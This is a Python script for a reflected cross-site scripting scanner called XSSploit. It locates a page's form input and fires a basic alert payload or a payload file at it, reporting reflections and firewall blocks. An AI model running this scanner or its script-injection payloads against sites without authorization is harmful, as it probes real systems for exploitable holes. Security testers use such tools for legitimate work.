from bs4 import BeautifulSoup
from colorama import Fore, init
from requests import Session, RequestException
import os
import sys

init(autoreset=True)

# Define colors for output
lc = Fore.LIGHTCYAN_EX
dc = Fore.CYAN
lr = Fore.LIGHTRED_EX
ly = Fore.LIGHTYELLOW_EX

# Global variables
xss_detected_count = 0
payload_urls = []
OnePayload = None

# Initialize the session
session = Session()

def print_banner():
    clear_console()
    banner = """
    oooooo  ooooo   .oooooo..o   .oooooo..o              oooo               o8o      .    
     `8888    d8'   d8P'    `Y8  d8P'    `Y8              `888               `"    .o8    
       Y888..8P     Y88bo.       Y88bo.       oo.ooooo.    888    .ooooo.   oooo  .o888oo  
        `8888'       `"Y8888o.    `"Y8888o.    888' `88b   888   d88' `88b  `888    888    
       .8PY888.          `"Y88b       `"Y88b   888   888   888   888   888   888    888    
      d8'  `888b    oo     .d8P  oo     .d8P   888   888   888   888   888   888    888 .  
    o888o  o88888o  8""88888P'   8""88888P'    888bod8P'  o888o  `Y8bod8P'  o888o   "888"  
                                               888                                         
                                               888                                         
    """
    tagline = """
    ----------------------------------------------------------------------------------------
                  [+] Coded by GH0STH4CKER & isPique       [+] Version 1.0.0
    ----------------------------------------------------------------------------------------
    """
    print(dc + banner)
    print(tagline)

def clear_console():
    os.system('clear' if os.name == 'posix' else 'cls')

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        print(
            lr + '[x] Invalid URL. Please ensure it starts with http:// or https://')
        sys.exit(1)

def read_payloads(payload_file):
    try:
        with open(payload_file, "r", encoding="utf-8-sig") as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(lr + f'[x] Payload file "{payload_file}" not found. Exiting...')
        sys.exit(1)

def test_xss(form_action, input_name, payload):
    global xss_detected_count
    global payload_urls
    global OnePayload

    payload_url = f"{form_action}?{input_name}={payload}"

    if OnePayload:
        print(f'\n[+] Sending Payload > {payload_url}')

    try:
        response = session.post(payload_url)
        response.raise_for_status()
    except RequestException as e:
        print(lr + f'\n[x] Error: {e}')
        return

    if payload in response.text:
        xss_detected_count += 1
        payload_urls.append(payload_url)
        if OnePayload:
            print(lc + "\n[+] XSS vulnerability detected!")
        else:
            clear_console()
            print_banner()
            print(f'\n[+] Sending Payload > {payload_url}')
            print(f'\n[+] Successful Payload Count: {xss_detected_count}')
    elif 'A potentially unsafe operation has been detected' in response.text or response.status_code == 403:
        if OnePayload:
            print(ly + '\n[!] Website Security (WAF) Denied Access!')
    elif response.status_code != 200:
        if OnePayload:
            print(
                lr + f"\n[x] Testing XSS Failed, Error code: {response.status_code}")
    else:
        if OnePayload:
            print(ly + "\n[!] No XSS vulnerability detected.")

def find_form_and_input_fields(soup, target_url):
    form_tag = soup.find("form")
    if form_tag:
        form_action = form_tag.get("action")
        if 'http' not in form_action:
            form_action = os.path.join(target_url, form_action)
    else:
        form_action = target_url

    input_tag = soup.find("input", {"type": "text"}) or soup.find(
        "input", {"type": "search"})
    input_name = input_tag.get("name") if input_tag else None

    return form_action, input_name

def main():
    try:
        global OnePayload

        print_banner()

        # Get target URL from user
        target_url = input(lc + 'Target URL: ').strip()
        validate_url(target_url)

        # Get payload option from user
        xss_amnt = input('Payloads [one/all]: ').strip().lower()
        if xss_amnt == 'all':
            OnePayload = False
        elif xss_amnt == 'one':
            OnePayload = True
        else:
            print(lr + '[x] Invalid option. Exiting...')
            return

        # Single payload for quick testing
        single_payload = "<script>alert('xss');</script>"
        payload_file = "xsspayloads.txt"
        payloads = read_payloads(payload_file)

        # Send an HTTP GET request to the webpage to find form and input fields
        try:
            response = session.get(target_url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
        except RequestException as e:
            print(lr + f'[x] Error fetching target URL: {e}')
            return

        print('\n[+] Finding Input Fields')

        form_action, input_name = find_form_and_input_fields(soup, target_url)
        if not input_name:
            print(ly + 'Input Fields Not Found !')
            return

        if OnePayload:
            test_xss(form_action, input_name, single_payload)
        else:
            for payload in payloads:
                test_xss(form_action, input_name, payload)
            print(lc + f'\n[+] Successful XSS Payload count: {xss_detected_count}')
            if xss_detected_count > 0:
                print('\n[+] All successful Payloads:')
                for p in payload_urls:
                    print(p)
    except KeyboardInterrupt:
        print("\n[+] Exiting...")

if __name__ == "__main__":
    main()